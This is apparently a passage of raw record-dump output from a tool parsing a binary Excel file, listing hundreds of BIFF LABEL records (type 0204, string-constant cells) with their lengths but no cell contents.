' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
